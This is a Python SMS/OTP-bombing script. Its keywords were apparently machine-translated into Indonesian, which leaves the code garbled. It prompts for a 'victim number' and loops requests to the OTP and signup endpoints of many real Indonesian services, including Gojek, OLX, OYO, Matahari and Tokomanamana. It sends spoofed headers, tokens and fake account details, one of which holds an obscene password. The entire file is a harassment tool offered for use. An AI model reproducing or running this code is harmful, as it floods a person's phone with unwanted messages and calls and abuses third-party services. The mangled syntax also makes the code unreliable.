impor  permintaan  sebagai  reek , json , os , time , request
req = bau . Sesi ()
os . sistem ( 'jelas' )
kelas  nyepam :
	def  __init__ ( diri , _8 , _08 , _62 ):
		diri . _8 , diri . _08 , diri sendiri . _62 = _8 , _08 , _62
	def  mulai ( self ):
		coba :
			untuk  x  dalam  rentang ( 10 ):
				send = req . post ( "https://cmsapi.mapclub.com/api/signup-otp" , data = { "phone" : self . _08 }, headers = { "Connection" : "keep-hidup" , "User-Agent" : "Mozilla / 5.0 (Linux; Android 5.1.1; SM-G600S Build / LMY47V; wv) AppleWebKit / 537.36 (KHTML, seperti Gecko) Versi / 4.0 Chrome / 59.0.3071.125 Mobile Safari / 537.36" }). teks
				jika  "ok"  di  kirim : lanjutkan
				lain : istirahat
			untuk  x  dalam  rentang ( 10 ):
				send = req . post ( "https://api.adakami.id/adaKredit/pesan/kodeVerifikasi" , data = json . dumps ({ "ketik" : 0 , "nomor" : "0" + self . _8 }), headers = { "content-type" : "application / json; charset = UTF-8" , "content-length" : "34" , "accept-encoding" : "gzip" , "user-agent" :"terima-bahasa" : "dalam" , "x-ada-token" : "" , "x-ada-appid" : "800006" , "x-ada-os" : "android" , "x-ada- channel " : " default " , " x-ada-mediasource " : " " , " x-ada-agency " : " adtubeagency " , " x-ada-campaign " : " AdakamiCampaign " , " x-ada-role " : "1" , "x-ada-appversion " : " 1.7.0 " , " x-ada-device " : " " ,"x-ada-model" : "SM-G935FD" , "x-ada-os-ver" : "7.1.1" , "x-ada-androidid" : "a4341a2sa90a4d97" , "x-ada-aid" : "c7bbb23d-a220-4d43-9caf-153608f9bd39" , "x-ada-afid" : "1580054114839-7395423911531673296" }). teks
				jika  "Permintaan kode pengungkit sudah melebihi batas. Silakan coba lagi besok."  di  kirim : istirahat
				lain : lanjutkan
			untuk  x  dalam  rentang ( 10 ):
				send = json . memuat ( reek . get ( f "https://id.jagreward.com/member/verify-mobile/ { self . _8 } " ). teks )
				if  send [ "message" ] == "Anda akan menerima panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini." : lanjutkan
				lain : istirahat
			untuk  x  dalam  rentang ( 10 ):
				send = req . posting ( "https://tokomanamana.com/ma/auth/request_token_merchant/" , data = { "phone" : self . _08 }, headers = { "Host" : "tokomanamana.com" , "Connection" : "keep -alive " , " Content-Length " : " 18 " , " Accept " : " * / * " , " Origin " : " https://tokomanamana.com " , ""agen-pengguna" : "Mozilla / 5.0 (Linux; Android 5.1.1; SM-G600S Build / LMY47V; wv) AppleWebKit / 537.36 (KHTML, seperti Gecko) Versi / 4.0 Chrome / 59.0.3071.125 Mobile Safari / 537.36" , "Jenis Konten" : "application / x-www-form-urlencoded; charset = UTF-8" , "Perujuk" : "https://tokomanamana.com/ma/register" , "Terima-Pengkodean" : "gzip , deflate " , " Accept-Language " : " id-ID, en-US; q = 0.8 " }). teks
				jika  "Kode OTP berhasil dikirim!"  sedang  dikirim : lanjutkan
				lain : istirahat
			untuk  x  dalam  rentang ( 10 ):
				send = req . pos ( "https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id" , data = json . dumps ({ "phone" : self . _8 , "country_code" : " +62 " , " country_iso_code " : " ID " , " nod " : " 4 " , " send_otp " : " true " , " devise_role " : " Consumer_Guest " }),"identity-gateway.oyorooms.com" , "consumer_host" : "https://www.oyorooms.com" , "accept-language" : "id" , "access_token" : "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc =" , "User-Agent : "Mozilla / 5.0 (Linux; Android 10; SM-A107F) AppleWebKit / 537.36 (KHTML, seperti Gecko) Chrome / 83.0.4103.106 Mobile Safari / 537.36" , "Content-Type" : "application / json" , "accept" : "* / *" , "origin" : "https://www.oyorooms.com " , " referer " :"https://www.oyorooms.com/login" , "Accept-Encoding" : "gzip, deflate, br" }). teks
				jika  "SUCCESSFULLY GENERATED OTP"  di  kirim : lanjutkan
				lain : istirahat
			untuk  x  dalam  rentang ( 10 ):
				send = req . posting ( "https://app.cairin.id/v1/app/sms/sendCaptcha" , data = { "haveImageCode" : "0" , "fileName" : "6f8c3b90c845f09ff1bfe714a30aede8" , "phone" : self . _08 , " imageCode " : " " , " userImei " : " " , " type " : " registry " }, headers = { " user-agent " :"Mozilla / 5.0 (Linux; Android 5.1.1; SM-J320M Build / LMY47V; wv) AppleWebKit / 537.36 (KHTML, seperti Gecko) Versi / 4.0 Chrome / 86.0.4240.110 Mobile Safari / 537.36" }). teks
				jika  "leftTimes"  di  kirim : lanjutkan
				lain : istirahat
			untuk  x  dalam  rentang ( 10 ):
				send = req . posting ( "https://www.olx.co.id/api/auth/authenticate" , data = json . dumps ({ "grantType" : "retry" , "method" : "sms" , "phone" : self . _62 , "language" : "id" }), headers = { "accept" : "* / *" , "x-newrelic-id" : "VQMGU1ZVDxABU1lbBgMDUlI =" , ""83b09e49653c37fb4dc38423d82d74d7 # 1597271158063" , "user-agent" : "Mozilla / 5.0 (Linux; Android 5.1.1; SM-G600S Build / LMY47V; wv) AppleWebKit / 537.36 (KHTML, seperti Gecko) Versi / 4.0 Chrome / 59.0.3071.125 Mobile Safari / 537.36 " , " content-type " : " application / json " }). teks
				jika  "status"  di  kirim : lanjutkan
				lain : istirahat
			untuk  x  dalam  rentang ( 10 ):
				send = req . post ( "https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json" , data = json . dumps ({ "phoneNumber" : self . _62 , "platform " : " wa " }), headers = { " content-type " : " application / json " , " user-agent " : " Mozilla / 5.0 (Linux; Android 5.1.1; SM-G600S Build / LMY47V; wv) AppleWebKit / 537.36 (KHTML, seperti Gecko) Version / 4.0 Chrome / 59.0.3071.125 Mobile Safari / 537.36 " }).
				jika  ""  di  kirim : lanjutkan
				lain : istirahat
			untuk  x  dalam  rentang ( 10 ):
				send = req . posting ( "https://api.payfazz.com/v2/phoneVerifications" , data = { "phone" : self . _08 }, headers = { "Host" : "api.payfazz.com" , "content-length" : "17" , "accept" : "* / *" , "origin" : "https://www.payfazz.com" , "user-agent" :"Mozilla / 5.0 (Linux; Android 5.1.1; SM-G600S Build / LMY47V; wv) AppleWebKit / 537.36 (KHTML, seperti Gecko) Versi / 4.0 Chrome / 59.0.3071.125 Mobile Safari / 537.36" , "content-type" : "application / x-www-form-urlencoded; charset = UTF-8" , "referer" : "http://www.payfazz.com/register/BEN6ZF74XL" , "accept-encoding" : "gzip, deflate, br " , " accept-language " : " id-ID, id; q = 0.9, en-US; q = 0.8, en; q = 0.7 " }). teks
				jika  "phoneVerificationId"  di  kirim : lanjutkan
				lain : istirahat
			untuk  x  dalam  rentang ( 10 ):
				send = req . post ( "https://harvestcakes.com/register" , data = { "phone" : self . _8 }, headers = { "user-agent" : "Mozilla / 5.0 (Linux; Android 5.1.1; SM-G600S Build / LMY47V; wv) AppleWebKit / 537.36 (KHTML, like Gecko) Version / 4.0 Chrome / 59.0.3071.125 Mobile Safari / 537.36 " }). teks
				jika  "fungsi"  di  kirim : lanjutkan
				lain : istirahat
			untuk  x  dalam  rentang ( 10 ):
				send = bau . get ( "https://api.danacita.co.id/users/send_otp/?mobile_phone=" + self . _08 , headers = { "user-agent" : "Mozilla / 5.0 (Linux; Android 5.1.1; SM -G600S Build / LMY47V; wv) AppleWebKit / 537.36 (KHTML, seperti Gecko) Version / 4.0 Chrome / 59.0.3071.125 Mobile Safari / 537.36 " })
				load = json . memuat ( kirim . teks )
				if  load [ "detail" ] ==  "Berhasil mengirim SMS OTP" : lanjutkan
				lain : istirahat
			untuk  x  dalam  rentang ( 10 ):
				send = req . post ( "https://api.gojekapi.com/v5/customers" , data = { "email" : "nsjwwiwiwisnsnn12@gmail.com" , "name" : "akuinginterbang12" , "phone" : self . _62 , " signed_up_country " : " ID " }, headers = { " X-Session-ID " : " f8b67b26-c6a4-44d2-9d86-8d93a80901c9 " , " X-Platform " : " Android " ,, "X-AppVersion" : "3.52.2" , "X-AppId" : "com.gojek.app" , "Terima" : "application / json" , "Otorisasi" : "Bearer" , "X-User- Ketik " : " customer " , " Accept-Language " : " id-ID " , " X-User-Locale " : " id_ID " , " Host " : " api.gojekapi.com " , " Connection " : " Keep- Hidup " ,"Terima-Enkode" : "gzip" , "Agen-Pengguna" :"okhttp / 3.12.1" }). teks
				jika  "berhasil"  di  kirim : lanjutkan
				lain : istirahat
			untuk  x  dalam  rentang ( 10 ):
				send = req . post ( "https://u.icq.net/api/v14/rapi/auth/sendCode" , data = json . dumps ({ "reqId" : "64708-1593781791" , "params" : { "phone" : self . _62 , "language" : "en-US" , "route" : "sms" , "devId" : "ic1rtwz1s1Hj1O0r" , "application" : "icq" }}),Bangun SM-G600S / LMY47V; wv) AppleWebKit / 537.36 (KHTML, seperti Gecko) Version / 4.0 Chrome / 59.0.3071.125 Mobile Safari / 537.36 "}). teks
				jika  "hasil"  di  kirim : lanjutkan
				lain : istirahat
			untuk  x  dalam  rentang ( 10 ):
				send = bau . get ( f "https://japi.maucash.id/welab-user/api/v1/send-sms-code?mobile= { self . _8 } & channelType = 0" , headers = { "Host" : "japi. maucash.id " , " accept " : " application / json, text / plain, * / * " , " x-origin " : " google play " , " x-org-id " : " 1 " , " x-product -code " : " YN-MAUCASH " , " x-app-version " :"android" , "accept-encoding" : "gzip" , "user-agent" : "okhttp / 3.12.1" }). teks
				jika  "Permintaan BERHASIL"  di  send : terus
				lain : istirahat
			untuk  x  dalam  rentang ( 10 ):
				a = bau . dapatkan ( "https://www.matahari.com/customer/account/create/" )
				b = a . cookie [ "PHPSESSID" ]
				send = req . pos ( "https://www.matahari.com/rest/V1/thorCustomers" , data = json . dumps ({ "thor_customer" : { "name" : "Kang Pacman" , "card_number" : False , "email_address" : "aapafandi01@gmail.com" , "mobile_country_code" : "+62" , "gender_id" : "1" , "mobile_number" : self . _08 ,"password" : "kontolanjingmemek6793" , "birth_date" : "10/04/2000" }}), headers = { "Host" : "www.matahari.com" , "content-length" : "245" , "x -newrelic-id " : " Vg4GVFVXDxAGVVlVBgcGVlY = " , " x-diminta-dengan " : " XMLHttpRequest " , " user-agent " : " Mozilla / 5.0 (Linux; Android 8.1.0; SM-J111F Build / LMY47V; wv) AppleWebKit / 537.36 (KHTML, seperti Gecko) Versi / 4.0 Chrome / 87.0.4280.141 Mobile Safari / 537.36 " , " content-type " : " application / json ", "accept" : "* / *" , "referer" : "https://www.matahari.com/customer/account/create/" , "accept-encoding" : "gzip, deflate" , "accept-language " : " id-ID, id; q = 0.9, en-US; q = 0.8, en; q = 0.7 " , " cookie " : f" PHPSESSID = { b } " }). teks
				jika  "Sukses"  di  kirim : lanjutkan
				lain : istirahat
			untuk  x  dalam  rentang ( 100 ):
				send = req . posting ( "https://tokomanamana.com/ma/auth/request_token_merchant/" , data = { "phone" : self . _08 }, headers = { "Host" : "tokomanamana.com" , "Connection" : "keep -alive " , " Content-Length " : " 18 " , " Accept " : " * / * " , " Origin " : " https://tokomanamana.com " , ""agen-pengguna" : "Mozilla / 5.0 (Linux; Android 5.1.1; SM-G600S Build / LMY47V; wv) AppleWebKit / 537.36 (KHTML, seperti Gecko) Versi / 4.0 Chrome / 59.0.3071.125 Mobile Safari / 537.36" , "Jenis Konten" : "application / x-www-form-urlencoded; charset = UTF-8" , "Perujuk" : "https://tokomanamana.com/ma/register" , "Terima-Pengkodean" : "gzip , deflate " , " Accept-Language " : " id-ID, en-US; q = 0.8 " }). teks
				jika  "Kode OTP berhasil dikirim!"  sedang  dikirim : lanjutkan
				lain : istirahat
			keluar ( "# Selesai" )
		kecuali  bau . pengecualian . ReadTimeout : exit ( "[!] 1 Pada Koneksi" )
		kecuali  bau . pengecualian . ConnectionError : exit ( "[!] 1 Pada Koneksi" )
		kecuali ( KeyboardInterrupt , EOFError ): exit ( "[!] Exit" )
__import__ ( "os" ). sistem ( "jelas" )
print ( "JANGAN SALAH GUNAKAN \ n Gunakan Format 08 ×% Contoh: 08729373998 \ n Sc By: Mhmmd Latip" )
sementara  Benar :
	coba :
		a = masukan ( "[+] Nomer Korban>" )
		print ( 'Sedang Menyepam ...' )
		asu = a [ 0 : 2 ]
		if  a  in ( "" , "" ): print ( "[!] Jangan Kosong Ajg" )
		elif  "08"  not  in  asu : print ( "[!] Gunakan Nomer Dengan Awalan 08xxx \ n " )
		elif  len ( a ) <= 10 : print ( "[!] Nomer Harus Lebih Dari 10 Angka" )
		lain :
			b = a [ 1 : 12 ]
			c = "62" + b
			nyepam ( b , a , c ). mulai ()
			istirahat
	kecuali  Exception  as  ex : exit ( str ( ex ))
	kecuali ( KeyboardInterrupt , EOFError ): exit ( "[!] Exit" )
